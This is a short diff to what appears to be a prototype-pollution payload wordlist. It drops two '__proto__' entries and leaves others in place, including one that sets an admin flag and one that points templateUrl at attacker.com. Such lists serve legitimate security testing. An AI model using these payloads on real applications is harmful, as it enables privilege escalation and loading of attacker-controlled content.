@@ -68,7 +68,6 @@ constructor.prototype.admin=true
 {"__proto__": {"templateUrl": "//attacker.com/template.html"}}
 
 # ── LODASH / UNDERSCORE SPECIFIC ──
-{"__proto__": {"polluted": "yes"}}
 {"a.__proto__": {"polluted": "yes"}}
 {"a[__proto__]": {"polluted": "yes"}}
 {"path": ["__proto__", "polluted"], "value": "yes"}
@@ -133,4 +132,3 @@ constructor:
     polluted: yes
 a:
   __proto__:
-    polluted: yes
